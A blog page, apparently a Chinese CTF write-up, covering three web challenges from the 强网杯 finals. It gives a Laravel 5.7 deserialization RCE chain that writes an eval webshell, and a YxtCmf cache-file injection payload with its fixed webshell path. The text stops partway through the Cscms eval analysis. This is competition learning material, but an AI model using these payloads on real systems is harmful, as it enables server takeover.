@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1WngiF9tTCMZq7SKqDaOa6g 提取码: kj7b）0x01 laravel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯决赛RW的3个Web题">
+<meta property="og:url" content="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/index.html">
+<meta property="og:site_name" content="Cyc1e&#39;s Blog">
+<meta property="og:description" content="这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1WngiF9tTCMZq7SKqDaOa6g 提取码: kj7b）0x01 laravel">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-d33cace0a96442b9.png">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8418106-b6dc48cf00e8f738.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-9f563edeb5d07a5b.png">
+<meta property="article:published_time" content="2019-06-16T14:22:41.000Z">
+<meta property="article:modified_time" content="2020-03-04T10:59:14.562Z">
+<meta property="article:author" content="Cyc1e">
+<meta property="article:tag" content="cms">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="RealWorld">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-d33cace0a96442b9.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>强网杯决赛RW的3个Web题 | Cyc1e's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Cyc1e's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyc1e's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Cyc1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyc1e's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯决赛RW的3个Web题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-06-16 22:22:41" itemprop="dateCreated datePublished" datetime="2019-06-16T22:22:41+08:00">2019-06-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-04 18:59:14" itemprop="dateModified" datetime="2020-03-04T18:59:14+08:00">2020-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">Cyc1e的CTF之路</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h5 id="这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https-pan-baidu-com-s-1WngiF9tTCMZq7SKqDaOa6g-提取码-kj7b）"><a href="#这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https-pan-baidu-com-s-1WngiF9tTCMZq7SKqDaOa6g-提取码-kj7b）" class="headerlink" title="这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g 提取码: kj7b）"></a>这次真的是神仙打架，web狗无处苟活，AWD只有PWN题，所以Web狗只能奋力怼RW的3个web，这里不得不膜一下大师傅们，审得太快了，第二天排队排太久，啥血也没抢到，简单写下3个web的解题思路……这里放下源码，方便复现（<a href="https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g" target="_blank" rel="noopener">https://pan.baidu.com/s/1WngiF9tTCMZq7SKqDaOa6g</a> 提取码: kj7b）</h5><h1 id="0x01-laravel"><a href="#0x01-laravel" class="headerlink" title="0x01 laravel"></a>0x01 laravel</h1><p>这个下发的版本是5.7，并且之前有人发表过对该版本的漏洞的分析文章，所以这题差不多算是一个web签到题，这里贴一下链接:<a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/</a><br>在写这个分析文章的时候，大师傅可能避嫌把这个页面关了，也就是在程序流处理过程中，我们可以控制序列化的内容，所以只要构造一个反序列化点就可以触发该反序列RCE漏洞，刚好这个题目的设定就是给了反序列化点的。<br>/public/index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">namespace App\Http\Controllers;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TaskController</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">            unserialize($code);</span><br><span class="line">            return &quot;Welcome to qiangwangbei!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里给了一个反序列化利用点所以我们只要把序列化的内容赋给code参数就可以了，直接贴Exp代码（反正也不是我写的,因为赛制要求拿到shell，而且只有<strong>index.php</strong>可写，这个地方坑了我的第一次机会，吐槽一下）<br><strong>get.php</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $command;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $parameters;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $app;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $test;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span></span></span><br><span class="line"><span class="php">	    &#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;command = $command;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;parameters = $parameters;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;test=$class;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;app=$app;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">GenericUser</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $attributes;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span></span><br><span class="line"><span class="php">	        <span class="keyword">$this</span>-&gt;attributes = $attributes;</span></span><br><span class="line"><span class="php">	    &#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $hasBeenBootstrapped = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $bindings;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">$this</span>-&gt;bindings=$bind;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>rce.php</strong>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"get.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'echo "&lt;?php eval(\$_REQUEST[Cyc1e]);?&gt;" &gt; index.php'</span>),<span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>))),<span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>))))));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>GET方式把payload打过去就好了</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL：/index.php/<span class="keyword">index</span>?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A50%3A%22echo+%22%3C%3Fphp+<span class="keyword">eval</span>%28%5C%24_REQUEST%5Bpass%5D%29%3B%3F%3E%22+%3E+index.php%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x02-YxtCmf"><a href="#0x02-YxtCmf" class="headerlink" title="0x02 YxtCmf"></a>0x02 YxtCmf</h1><p>第一天的下午一直在审这个cmf框架的源码，是基于ThinkPhp框架进行二次开发的，thinphp的缓存机制算是比较有意思的，主要思路是通过控制缓存文件来拿shell，查看thinkcmf的一个文档<br><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-d33cace0a96442b9.png" alt><br>设置了动态更新系统配置的函数，查看一下sp_set_dynamic_config函数的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sp_set_dynamic_config</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!is_array($data))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(sp_is_sae())&#123;</span><br><span class="line">		$kv = <span class="keyword">new</span> SaeKV();</span><br><span class="line">		$ret = $kv-&gt;init();</span><br><span class="line">		$configs=$kv-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $kv-&gt;set(<span class="string">'THINKCMF_DYNAMIC_CONFIG'</span>, serialize($configs));</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(defined(<span class="string">'IS_BAE'</span>) &amp;&amp; IS_BAE)&#123;</span><br><span class="line">		$bae_mc=<span class="keyword">new</span> BaeMemcache();</span><br><span class="line">		$configs=$bae_mc-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $bae_mc-&gt;set(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>,serialize($configs),MEMCACHE_COMPRESSED,<span class="number">0</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$config_file=<span class="string">"./data/conf/config.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists($config_file))&#123;</span><br><span class="line">			$configs=<span class="keyword">include</span> $config_file;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			$configs=<span class="keyword">array</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = file_put_contents($config_file, <span class="string">"&lt;?php\treturn "</span> . var_export($configs, <span class="keyword">true</span>) . <span class="string">";"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	sp_clear_cache();</span><br><span class="line">	S(<span class="string">"sp_dynamic_config"</span>,$configs);</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把$config和字符串“THINKCMF_DYNAMIC_CONFIG”，传入了set函数，set函数是一个写入缓存文件的函数，也就是把sp_set_dynamic_config传入的固定字符串处理后当作文件名生成，传入的$config的数据为缓存文件的内容，也就是说控制了缓存内容在拿到缓存文件名就可以控制缓存文件了，所以接下来就是找哪一个sp_set_dynamic_config函数我们可以用，因为题目环境设定是把admin、install等目录给去了，也就限制了利用访问，本菜习惯用notepad++,所以全局搜索sp_set_dynamic_config的调用情况，再排除一下，最终确定了\application\Api\Controller\OauthController.class.php中的sp_set_dynamic_config可以任意控制</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectionAuthocode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="symbol">$postdata</span>=I(<span class="string">'post.'</span>);</span><br><span class="line">        <span class="symbol">$co</span>nfigs[<span class="string">"authoCode"</span>]=<span class="symbol">$postdata</span>[<span class="string">'authoCode'</span>];</span><br><span class="line">        sp_set_dynamic_config(<span class="symbol">$co</span>nfigs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>缓存文件里的内容是注释后的序列化值，所以构造一下post值换行再注释后面的语句就可以写入任意代码了</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST：authoCode=Cyc<span class="number">1</span>e<span class="meta">%</span><span class="number">0</span>aeval<span class="comment">($_REQUEST[pass])</span>;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是缓存文件名的问题了（毕竟缓存文件名是个md5值，爆破是不可能的），分析set函数即可，发现就是两个固定的字符串拼接处理，所以这就是一个固定的值了，缓存的文件名固定为ed182ead0631e95e68e008bc1d3af012.php，本地生成了直接上台打就行了，第一天下午就分析到这，卡在了路由触发规则上，大写的尴尬，到酒店继续看了下，是自己傻了，路由规则看错了，所以最后的payload<br> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：<span class="regexp">/index.php/</span>api<span class="regexp">/oauth/i</span>njectionAuthocode</span><br><span class="line">POST：authoCode=Cyc1e%<span class="number">0</span>aeval(<span class="variable">$_REQUEST</span>[Cyc1e]);<span class="regexp">//</span></span><br><span class="line">PATH：<span class="regexp">/data/</span>runtime<span class="regexp">/Temp/</span>ed182ead0631e95e68e008bc1d3af012.php</span><br></pre></td></tr></table></figure><br>直接触发就好了</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8418106-b6dc48cf00e8f738.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<h1 id="0x03-Cscms"><a href="#0x03-Cscms" class="headerlink" title="0x03 Cscms"></a>0x03 Cscms</h1><p>这题晚上才开始审，查了下最近报出的洞，发现这个cms好像是凉了的，最近的也就是17年的了，有一个SSTI的补丁，而且怎么找到找不到这个补丁的代码，就顺着这个思路去了，既然不让我找到，那估计就有问题的嘛，2333，这题给的题目信息一样是删除了admin、install目录，所以一样是前台的洞了，既然是SSTI，那肯定是有一个代码执行点的，全局搜索eval函数，最终定位到<br>\cscms\app\models\Csskins.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php标签处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cscms_php</span><span class="params">($php,$content,$str)</span> </span>&#123;</span><br><span class="line">        $evalstr=<span class="string">" return $content"</span>;</span><br><span class="line">	    $newsphp=<span class="keyword">eval</span>($evalstr);</span><br><span class="line">        $str=str_replace($php,$newsphp,$str);</span><br><span class="line">	    <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>只要控制了$content，就可以执行任意代码，进行函数的回溯，这个最难受了，就一个template_parse函数调用了cscms_php，定位php处理代码</p>
